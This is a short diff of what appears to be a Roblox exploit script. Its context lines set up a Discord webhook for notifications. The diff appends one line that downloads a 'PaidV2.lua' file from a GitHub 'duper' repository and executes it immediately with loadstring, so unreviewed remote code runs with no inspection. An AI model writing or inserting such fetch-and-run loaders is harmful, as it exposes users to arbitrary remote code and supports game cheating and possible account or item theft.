@@ -12,3 +12,5 @@ else
     warn("Script will still work, but you won't receive Discord notifications.")
     getgenv().UserWebhookURL = nil
 end
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/IAODO/duper/refs/heads/main/PaidV2.lua', true))() 
